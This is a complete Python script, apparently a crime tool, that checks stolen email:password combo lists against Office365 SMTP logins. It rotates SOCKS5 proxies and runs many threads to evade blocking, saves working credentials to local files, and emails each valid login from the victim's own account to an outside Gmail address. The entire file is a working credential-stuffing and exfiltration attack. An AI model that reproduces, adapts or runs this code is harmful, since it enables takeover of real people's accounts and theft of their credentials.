#!/usr/bin/env python

import smtplib
import threading
import time
from colorama import Fore, Back, Style
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socks
import socket

os.system('cls')

def send_html_email(subject, html_content, from_email, password, to_email, proxy=None):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email

    part = MIMEText(html_content, 'html')
    msg.attach(part)

    try:
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            socket.socket = socks.socksocket
        
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print(Fore.GREEN + 'SMTP WORKED !!!! ' + to_email + Style.RESET_ALL)
    except Exception as e:
        print(Fore.MAGENTA + '3RR0RR: ' + str(e) + Style.RESET_ALL)

def Validate(combo, proxy=None):
    Combo = combo.split(':')
    username = Combo[0].strip()
    password = Combo[1].strip()
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.ehlo()
    server.starttls()
    try:
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            socket.socket = socks.socksocket
        
        server.login(username, password)
        print(Back.GREEN + Fore.WHITE + 'Valid Login: ' + combo + Style.RESET_ALL)
        output = 'valid-office365.txt'
        with open(output, 'a') as oo:
            oo.write(combo + '\n')
        out = f'smtp.office365.com|587|{combo.replace(":", "|")}'
        with open('SMTP-office365.txt', 'a') as out_file:
            out_file.write(out + '\n')
        html_content = f'''
        <html>
        <head><style>body {{ font-family: Arial, sans-serif; }}</style></head>
        <body>
        <p><strong>Valid Login:</strong> {combo}</p>
        <p><strong>Details:</strong> {out}</p>
        </body>
        </html>
        '''
        send_html_email('S.M.T.P - T.E.R.G.R.A.B | By Office365 Ripped Mail', html_content, username, password, 'scam.rest@gmail.com', proxy)
    except smtplib.SMTPAuthenticationError:
        print(Fore.MAGENTA + 'Login failed => ' + combo + Style.RESET_ALL)
    finally:
        server.quit()

def check_proxy(proxy):
    try:
        proxy_ip, proxy_port = proxy.split(':')
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.quit()
        return True
    except:
        return False

def proxy_checker_thread(proxies, valid_proxies):
    while proxies:
        proxy = proxies.pop(0)
        if check_proxy(proxy):
            valid_proxies.append(proxy)

def Blacklist(comb, proxy=None):
    with open('BlackList.txt', 'r') as file:
        blacklist = file.read().splitlines()
    domain = comb.split(':')[0].split('@')[1].strip()
    if domain in blacklist:
        print(Fore.YELLOW + 'BackListed ! ', comb)
    else:
        Validate(comb, proxy)

def process_file(file_path, proxy_file_path=None):
    proxies = []
    if proxy_file_path:
        with open(proxy_file_path, 'r') as proxy_file:
            proxies = [line.strip() for line in proxy_file]

    valid_proxies = []
    if proxies:
        threads = []
        num_threads = min(len(proxies), 200)  # Limit number of proxy check threads
        for _ in range(num_threads):
            thread = threading.Thread(target=proxy_checker_thread, args=(proxies, valid_proxies))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    with open(file_path, 'r') as f:
        combos = f.readlines()

    if valid_proxies:
        for combo in combos:
            proxy = valid_proxies.pop(0) if valid_proxies else None
            Blacklist(combo.strip(), proxy)
    else:
        for combo in combos:
            Blacklist(combo.strip(), None)

banner = '╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗\n║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║\n╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝'
ban = f'''{banner}\n\n By : AnnaQitty'''
print(Fore.LIGHTGREEN_EX + ban + Style.RESET_ALL)
file_path = input(Fore.RED + '+[+] ComboList : ' + Style.RESET_ALL)
proxy_file_path = input(Fore.LIGHTGREEN_EX + '+[+] ProxyList (optional) : ' + Style.RESET_ALL)
Thread_user = int(input(Fore.LIGHTGREEN_EX + '+[+] Threads : ' + Style.RESET_ALL))

# Example threading implementation
def threaded_task():
    process_file(file_path, proxy_file_path)

threads = []
for i in range(Thread_user):
    thread = threading.Thread(target=threaded_task)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print(Fore.LIGHTGREEN_EX + 'Good Job !! Completed Checked' + Style.RESET_ALL)
